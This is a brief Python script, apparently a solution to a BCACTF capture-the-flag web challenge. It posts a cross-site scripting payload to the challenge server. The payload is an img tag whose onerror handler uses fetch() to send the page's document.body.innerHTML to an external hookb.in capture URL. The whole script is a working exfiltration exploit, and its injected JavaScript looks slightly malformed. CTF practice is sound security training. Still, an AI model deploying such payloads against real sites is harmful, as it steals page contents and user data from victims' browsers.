#!/usr/bin/python3

import re

import requests

url = "http://webp.bcactf.com:49155/"
our_url = "https://hookb.in/Z2yqQeVM6dIR33eLoxZl"

payload = {	"text": f'<img src="x"onerror="fetch(`{our_url}?f=${{encodeURIComponent(document.body.innerHTML}}`)"'}
#.slice(180, 240))

r = requests.post(url, data = payload)

print(r.text)
